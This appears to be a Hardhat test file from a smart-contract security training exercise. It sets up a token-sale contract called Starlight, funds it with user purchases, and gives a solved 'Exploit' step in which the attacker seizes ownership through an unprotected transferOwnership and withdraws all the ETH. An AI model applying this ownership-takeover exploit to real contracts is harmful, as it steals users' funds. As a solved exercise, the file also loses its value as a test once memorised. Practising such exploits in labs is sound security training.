const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('Access Control Exercise 4', function () {

    let deployer, user1, user2, user3, attacker;

    USER1_PURCHASE = ethers.utils.parseEther("95")
    USER2_PURCHASE = ethers.utils.parseEther("65")
    USER3_PURCHASE = ethers.utils.parseEther("33")

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, attacker] = await ethers.getSigners();

        this.attackerInitialETHBalance = await ethers.provider.getBalance(attacker.address);
        
        const StarlightFactory = await ethers.getContractFactory(
            'contracts/access-control-4/Starlight.sol:Starlight',
            deployer
        );
        this.starlight = await StarlightFactory.deploy();
        
        // Users buy starlight tokens
        await this.starlight.connect(user1).buyTokens(
            USER1_PURCHASE.mul(100), user1.address, {value: USER1_PURCHASE}
        )
        await this.starlight.connect(user2).buyTokens(
            USER2_PURCHASE.mul(100), user2.address, {value: USER2_PURCHASE}
        )
        await this.starlight.connect(user3).buyTokens(
            USER3_PURCHASE.mul(100), user3.address, {value: USER3_PURCHASE}
        )
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        await this.starlight.connect(attacker).transferOwnership(attacker.address);
        await this.starlight.connect(attacker).withdraw();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Attacker stole all the ETH from the token sale contract
        let attackerBalance = await ethers.provider.getBalance(attacker.address);
        expect(attackerBalance).to.be.gt((
            this.attackerInitialETHBalance.add(USER1_PURCHASE).add(USER2_PURCHASE).
            add(USER3_PURCHASE).sub(ethers.utils.parseEther("0.2"))
        ));
        
    });
});
